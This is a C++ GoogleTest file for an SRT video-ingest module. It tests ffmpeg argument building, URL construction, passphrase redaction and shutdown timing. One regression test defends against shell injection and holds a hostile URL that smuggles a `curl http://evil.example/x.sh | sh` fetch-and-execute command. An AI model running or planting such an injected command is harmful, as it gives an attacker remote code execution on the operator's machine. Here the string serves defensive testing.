#include "modules/SrtFfmpegArgs.h"

#include "modules/Interfaces.h"

#include <gtest/gtest.h>

#include <algorithm>
#include <chrono>
#include <memory>
#include <string>
#include <thread>
#include <vector>

using corevideo::modules::SrtEndpointConfig;
using corevideo::modules::buildSrtIngestArgv;
using corevideo::modules::buildSrtUrl;
using corevideo::modules::percentEncodeSrtValue;
using corevideo::modules::redactedSrtUrl;

namespace {

SrtEndpointConfig baseConfig() {
  SrtEndpointConfig config;
  config.host = "ingest.example.com";
  config.port = 9000;
  return config;
}


// SECURITY REGRESSION. The ingest decoder used to interpolate this url into a
// single command line and run it through `/bin/sh -c`. Because buildSrtUrl
// deliberately tolerates a PASTED "srt://host:port", a remote contributor's
// connection string reaches that shell — so a hostile string was arbitrary code
// execution as the operator. argv keeps a url as exactly ONE argument no matter
// what it contains, and nothing in the vector may look like a shell fragment.
TEST(SrtIngestArgv, HostileUrlStaysASingleArgumentAndNeverReachesAShell) {
  const std::string hostile =
      "srt://host:9000\" ; curl http://evil.example/x.sh | sh ; echo \"";
  const auto argv = buildSrtIngestArgv("/usr/bin/ffmpeg", hostile, 1920, 1080, 60);

  const auto found = std::find(argv.begin(), argv.end(), hostile);
  ASSERT_NE(found, argv.end()) << "the url must survive verbatim as one argv element";
  ASSERT_NE(found, argv.begin()) << "the url must never be argv[0] (the image)";
  EXPECT_EQ(*(found - 1), "-i") << "and must sit behind -i, not as a bare option";

  // No element may be a joined command line: that is what made it injectable.
  for (const auto& argument : argv) {
    if (argument == hostile) {
      continue;
    }
    EXPECT_EQ(argument.find(';'), std::string::npos) << argument;
    EXPECT_EQ(argument.find('|'), std::string::npos) << argument;
    EXPECT_EQ(argument.find("curl"), std::string::npos) << argument;
  }
  EXPECT_EQ(argv.front(), "/usr/bin/ffmpeg");
  EXPECT_EQ(argv.back(), "pipe:1");
}

TEST(SrtIngestArgv, GeometryIsCarriedAsItsOwnArgument) {
  const auto argv = buildSrtIngestArgv("ffmpeg", "srt://h:9000", 1280, 720, 30);
  const auto size = std::find(argv.begin(), argv.end(), "-s");
  ASSERT_NE(size, argv.end());
  EXPECT_EQ(*(size + 1), "1280x720");
  const auto rate = std::find(argv.begin(), argv.end(), "-r");
  ASSERT_NE(rate, argv.end());
  EXPECT_EQ(*(rate + 1), "30");
}

// -y IS LOAD-BEARING, not tidiness. The audio sink is a pipe that already exists
// when ffmpeg opens it, so without -y ffmpeg treats it as a file to confirm,
// prompts "Overwrite? [y/N]", gets no answer and EXITS — killing the decoder and
// taking VIDEO down with it. The symptom is "adding audio broke ingest entirely".
TEST(SrtIngestArgv, EmbeddedAudioSinkForcesOverwriteAndStaysOneArgument) {
  const std::string sink = "\\\\.\\pipe\\corevideo-srt-ingest-audio-1234-0";
  const auto argv = buildSrtIngestArgv("ffmpeg", "srt://h:9000", 1920, 1080, 60, sink);

  EXPECT_NE(std::find(argv.begin(), argv.end(), "-y"), argv.end())
      << "without -y the decoder prompts to overwrite the pipe and exits";
  const auto found = std::find(argv.begin(), argv.end(), sink);
  ASSERT_NE(found, argv.end()) << "the sink path must survive verbatim as one argv element";
  EXPECT_EQ(found + 1, argv.end()) << "the sink is the second output's target, so it comes last";

  // The audio mapping must be OPTIONAL: a video-only contributor still decodes.
  const auto map = std::find(argv.begin(), argv.end(), "0:a:0?");
  ASSERT_NE(map, argv.end());
  EXPECT_EQ(*(map - 1), "-map");
  EXPECT_NE(std::find(argv.begin(), argv.end(), "f32le"), argv.end());
}

// A source with no audio sink must produce the SAME command as before audio
// existed — no -y, no second output — so the proven video path cannot regress.
TEST(SrtIngestArgv, VideoOnlyIngestIsUnchangedWhenNoAudioSinkIsRequested) {
  const auto argv = buildSrtIngestArgv("ffmpeg", "srt://h:9000", 1920, 1080, 60);
  EXPECT_EQ(argv.back(), "pipe:1");
  EXPECT_EQ(std::find(argv.begin(), argv.end(), "-y"), argv.end());
  EXPECT_EQ(std::find(argv.begin(), argv.end(), "f32le"), argv.end());
  EXPECT_EQ(std::find(argv.begin(), argv.end(), "-map"), argv.end());
}

}  // namespace

TEST(SrtFfmpegArgs, BuildsCallerUrlWithLiveTranstypeAndDefaultLatency) {
  const auto result = buildSrtUrl(baseConfig());
  ASSERT_TRUE(result.valid) << result.error;
  EXPECT_EQ(result.url, "srt://ingest.example.com:9000?mode=caller&transtype=live&latency=120000");
}

// The UI carries latency in milliseconds but FFmpeg's libsrt option is in
// MICROSECONDS. Getting this wrong by 1000x is the difference between a 120ms
// buffer and a two-minute one, and it would look like a working stream.
TEST(SrtFfmpegArgs, LatencyIsMicrosecondsAndMicrosecondsWin) {
  auto config = baseConfig();
  config.latencyMs = 200;
  EXPECT_NE(buildSrtUrl(config).url.find("latency=200000"), std::string::npos);

  config.latencyUs = 350000;
  EXPECT_NE(buildSrtUrl(config).url.find("latency=350000"), std::string::npos);
}

TEST(SrtFfmpegArgs, EncryptionAddsPassphraseAndDefaultsKeyLength) {
  auto config = baseConfig();
  config.passphrase = "supersecretpassphrase";
  const auto result = buildSrtUrl(config);
  ASSERT_TRUE(result.valid) << result.error;
  EXPECT_NE(result.url.find("passphrase=supersecretpassphrase"), std::string::npos);
  EXPECT_NE(result.url.find("pbkeylen=16"), std::string::npos);

  config.keyLength = 32;
  EXPECT_NE(buildSrtUrl(config).url.find("pbkeylen=32"), std::string::npos);
  // An out-of-spec key length would be rejected by libsrt at connect time.
  config.keyLength = 20;
  EXPECT_NE(buildSrtUrl(config).url.find("pbkeylen=16"), std::string::npos);
}

// A passphrase or stream id containing '&' or '=' would silently truncate the
// query — producing a stream that connects UNENCRYPTED or under the wrong id.
TEST(SrtFfmpegArgs, PercentEncodesValuesThatWouldBreakTheQuery) {
  EXPECT_EQ(percentEncodeSrtValue("a&b=c d"), "a%26b%3Dc%20d");

  auto config = baseConfig();
  config.passphrase = "pass&word=long";
  config.streamId = "#!::r=live/feed,m=publish";
  const auto result = buildSrtUrl(config);
  ASSERT_TRUE(result.valid) << result.error;
  EXPECT_NE(result.url.find("passphrase=pass%26word%3Dlong"), std::string::npos);
  EXPECT_EQ(result.url.find("passphrase=pass&word"), std::string::npos);
  EXPECT_NE(result.url.find("streamid=%23%21%3A%3Ar%3Dlive%2Ffeed%2Cm%3Dpublish"), std::string::npos);
}

TEST(SrtFfmpegArgs, AcceptsHostPortPastedIntoTheHostField) {
  SrtEndpointConfig config;
  config.host = "srt://relay.example.net:7001";
  const auto result = buildSrtUrl(config);
  ASSERT_TRUE(result.valid) << result.error;
  EXPECT_NE(result.url.find("srt://relay.example.net:7001?"), std::string::npos);
}

// Fail as a configuration error rather than at FFmpeg spawn time, where the
// message is far less useful mid-show.
TEST(SrtFfmpegArgs, RefusesIncompleteOrInvalidEndpoints) {
  SrtEndpointConfig noHost;
  noHost.port = 9000;
  EXPECT_FALSE(buildSrtUrl(noHost).valid);

  auto noPort = baseConfig();
  noPort.port = 0;
  EXPECT_FALSE(buildSrtUrl(noPort).valid);

  auto badPort = baseConfig();
  badPort.port = 70000;
  EXPECT_FALSE(buildSrtUrl(badPort).valid);

  auto badMode = baseConfig();
  badMode.mode = "sender";
  const auto modeResult = buildSrtUrl(badMode);
  EXPECT_FALSE(modeResult.valid);
  EXPECT_NE(modeResult.error.find("caller"), std::string::npos);

  // libsrt rejects passphrases under 10 characters at connect time.
  auto shortPass = baseConfig();
  shortPass.passphrase = "short";
  EXPECT_FALSE(buildSrtUrl(shortPass).valid);
}

TEST(SrtFfmpegArgs, ListenerAndRendezvousModesAreAccepted) {
  auto config = baseConfig();
  config.mode = "listener";
  EXPECT_NE(buildSrtUrl(config).url.find("mode=listener"), std::string::npos);
  config.mode = "rendezvous";
  EXPECT_NE(buildSrtUrl(config).url.find("mode=rendezvous"), std::string::npos);
}

// The passphrase rides in the URL and therefore in the FFmpeg command line. It
// must never reach a log, a snapshot or a support bundle.
TEST(SrtFfmpegArgs, RedactsThePassphraseButKeepsTheRestReadable) {
  auto config = baseConfig();
  config.passphrase = "supersecretpassphrase";
  config.streamId = "studio-a";
  const auto url = buildSrtUrl(config).url;
  const auto redacted = redactedSrtUrl(url);

  EXPECT_EQ(redacted.find("supersecretpassphrase"), std::string::npos);
  EXPECT_NE(redacted.find("passphrase=***"), std::string::npos);
  // Everything an operator needs for diagnosis survives.
  EXPECT_NE(redacted.find("srt://ingest.example.com:9000"), std::string::npos);
  EXPECT_NE(redacted.find("streamid=studio-a"), std::string::npos);
  EXPECT_NE(redacted.find("latency=120000"), std::string::npos);

  // A URL with no passphrase is returned untouched.
  EXPECT_EQ(redactedSrtUrl("srt://h:1?mode=caller"), "srt://h:1?mode=caller");
}

// Retiring an SRT ingest channel must be BOUNDED even when both of its readers
// are wedged -- the state a real show ends in, because an SRT listener spends
// most of its life blocked on a publisher that has not arrived (or has left).
//
// This is the shutdown half of the descriptor-ownership contract in
// SrtIngestCaptureAdapter.cpp: nothing outside a reading thread may close that
// thread's descriptor, so a stop can no longer break a reader by yanking its fd
// or handle. It has to unblock the readers instead -- kill the decoder (EOF) and,
// on Windows, keep re-issuing CancelIoEx/DisconnectNamedPipe for an audio thread
// parked in ConnectNamedPipe waiting for an ffmpeg that will never connect --
// and then join. A missed cancel, a lost EOF, or a retirement ordered wrong all
// present the same way: this test hangs.
//
// Two channels, deliberately in different states: one listener nothing ever
// publishes to (both readers parked), and one caller pointed at a closed port,
// which fails fast and keeps the reader churning through reconnect generations,
// so the stop can also land mid-retirement.
TEST(SrtIngestChannel, RetiringWedgedChannelsIsBounded) {
  auto device = corevideo::modules::createSrtIngestCaptureDevice();
  ASSERT_NE(device, nullptr);

  corevideo::modules::SrtIngestSourceConfig parked;
  parked.id = "srt-parked-input";
  parked.deviceId = "srt-parked";
  parked.name = "Parked listener";
  parked.mode = "listener";
  parked.host = "127.0.0.1";
  parked.port = 39217;

  corevideo::modules::SrtIngestSourceConfig churning;
  churning.id = "srt-churning-input";
  churning.deviceId = "srt-churning";
  churning.name = "Churning caller";
  churning.mode = "caller";
  churning.host = "127.0.0.1";
  churning.port = 39218;  // nothing listens here: connect fails, decoder exits

  device->configureSrtIngestSources({parked, churning});
  device->connect(parked.deviceId);
  device->connect(churning.deviceId);

  // Long enough for the readers to reach their blocking calls (and for the caller
  // to have turned over at least one decoder generation).
  std::this_thread::sleep_for(std::chrono::milliseconds(1200));

  const auto startedAt = std::chrono::steady_clock::now();
  device.reset();  // ~SrtIngestCaptureDevice -> stopAll -> stopChannel per channel
  const auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                           std::chrono::steady_clock::now() - startedAt)
                           .count();

  // Generous: the point is a BOUND, not a benchmark. The old code could sit out a
  // whole reconnect backoff rung (up to 10s) before the reader noticed the stop.
  EXPECT_LT(elapsed, 5000);
}
